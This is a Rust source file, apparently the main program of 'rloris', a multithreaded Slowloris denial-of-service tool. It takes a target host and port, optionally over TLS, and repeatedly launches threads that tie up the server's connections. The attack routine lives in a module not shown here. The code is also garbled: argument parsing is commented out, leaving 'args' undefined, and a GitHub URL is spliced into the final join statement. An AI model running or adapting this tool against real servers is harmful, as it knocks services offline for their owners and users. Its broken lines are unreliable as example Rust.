// https://github.com/NoraCodes/rloris

extern crate docopt;
extern crate rustc_serialize;
#[macro_use]
extern crate log;
extern crate env_logger;
extern crate num_cpus;
extern crate rustls;
extern crate webpki;
extern crate webpki_roots;

use docopt::Docopt;
use std::net::TcpStream;
use std::sync::Arc;
use std::thread;

mod slowloris_attack;
use slowloris_attack::slowloris_attack;

// fix -> RustcDecodable
#[derive(Debug)]
struct Args {
    arg_target: String,
    flag_port: Option<usize>,
    flag_timeout: u32,
    flag_cycles: u32,
    flag_ssl: bool,
    flag_nofinalize: bool,
    flag_domain: Option<String>,
    flag_repeat: bool,
    flag_threads: Option<usize>,
    cmd_get: bool,
    cmd_post: bool,
}


// Perform an attack against localhost, port 8000, using the POST verb: rloris post localhost --port=8000
// Perform an SSL attack against example.com, port 443: rloris get example.com --ssl
// Perform an SSL attack against 127.0.0.1, with domain name example.com: rloris get 127.0.0.1 --ssl --domain=example.com --repeat

fn main() {
    // Set up logging
    env_logger::init().unwrap();
    debug!("Logging successfully initialized.");
    // let args: Args = Docopt::new(USAGE)
    //     .and_then(|d| d.decode())
    //     .unwrap_or_else(|e| e.exit());

    // The default port is 80, but for SSL it's 443.
    let default_port = if args.flag_ssl { 443 } else { 80 };
    let port = args.flag_port.unwrap_or(default_port);

    let finalize = !args.flag_nofinalize;
    let cycles = args.flag_cycles;
    let timeout = args.flag_timeout;
    let repeat = args.flag_repeat;
    let threads = args.flag_threads.unwrap_or(num_cpus::get());
    let ssl = args.flag_ssl;
    let cmd_get = args.cmd_get;
    let cmd_post = args.cmd_post;
    // Extract targetting information
    let mut target = Target::new(args.arg_target, port);

    // Check for domain override
    if let Some(domain) = args.flag_domain {
        target.set_domain(&domain);
    }

    // Set up rustls process global
    let mut ssl_config = rustls::ClientConfig::new();
    ssl_config
        .root_store
        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
    let ssl_config = Arc::new(ssl_config);

    loop {
        println!(
            "Beginning SlowLoris against target {} with {} threads.",
            target.get_designator(),
            threads
        );
        let mut handles = Vec::with_capacity(threads);
        for threadn in 0..threads {
            let target = target.clone();
            let ssl_config = ssl_config.clone();
            handles.push(
                thread::spawn(move || {
                    // Attempt to connect to the target.
                    let mut tcp_stream = TcpStream::connect(target.get_designator())
                        .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect. {}", threadn, e); panic!()});
                    info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                    // If needed, connect SSL to the target.
                    if ssl {
                        // Attempt to connect SSL
                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(target.get_domain())
                            .unwrap_or_else(|e| {
                                error!("[CONTROL:{}] !!! Couldn't get DNS reference for domain. {}\nDid you provide a domain name, not an IP?", threadn, e);
                                panic!();
                            });
                        let mut ssl_stream = rustls::ClientSession::new(&ssl_config, tgt_domain);
                        info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
                        if cmd_get {
                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, false, threadn);
                        } else if cmd_post {
                            slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, true, threadn);
                        }
                    } else {
                        if cmd_get {
                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, false, threadn);
                        } else if cmd_post {
                            slowloris_attack(&mut tcp_stream, timeout, cycles, finalize, true, threadn);
                        }
                    }
                })
            );
        }

        if threads > 1 {
            for handle in handles {
                match handle.join() {
                    Ok(_) => print!("."),
                    Err(_) => print!("x"),
                };
                println!();
            }
        } else {
            // In this case there is only one thread. Pop it, join it, and suppress errors.
            handleshttps://github.com/NoraCodes/rloris.pop().unwrap().join().unwrap_or_else(|_| ());
        }
        if !repeat {
            break;
        }
    }
}